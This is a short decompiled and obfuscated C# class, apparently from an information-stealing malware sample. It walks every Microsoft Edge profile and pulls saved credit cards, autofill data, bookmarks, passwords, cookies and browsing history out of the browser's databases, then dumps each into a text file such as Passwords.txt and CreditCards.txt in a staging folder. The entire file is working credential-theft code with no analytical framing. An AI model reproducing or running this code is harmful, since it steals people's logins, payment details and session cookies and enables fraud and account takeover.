using System.Collections.Generic;
using System.IO;
using ns12;
using ns13;
using ns8;

namespace ns11;

internal sealed class Class41
{
	public static void smethod_0(string string_0)
	{
		string path = Class55.string_4 + Class55.string_2;
		if (!Directory.Exists(path))
		{
			return;
		}
		string text = string_0 + "\\Edge";
		Directory.CreateDirectory(text);
		string[] directories = Directory.GetDirectories(path);
		foreach (string text2 in directories)
		{
			if (File.Exists(text2 + "\\Login Data"))
			{
				List<Struct3> list_ = Class40.smethod_0(text2 + "\\Web Data");
				List<Struct4> list_2 = Class38.smethod_0(text2 + "\\Web Data");
				List<Struct6> list_3 = Class39.smethod_0(text2 + "\\Bookmarks");
				List<GStruct10> list_4 = Class52.smethod_0(text2 + "\\Login Data");
				List<Struct2> list_5 = Class48.smethod_0(text2 + "\\Cookies");
				List<Struct5> list_6 = Class51.smethod_0(text2 + "\\History");
				Class30.smethod_11(list_, text + "\\CreditCards.txt");
				Class30.smethod_7(list_2, text + "\\AutoFill.txt");
				Class30.smethod_9(list_3, text + "\\Bookmarks.txt");
				Class30.smethod_10(list_4, text + "\\Passwords.txt");
				Class30.smethod_6(list_5, text + "\\Cookies.txt");
				Class30.smethod_8(list_6, text + "\\History.txt");
			}
		}
	}
}
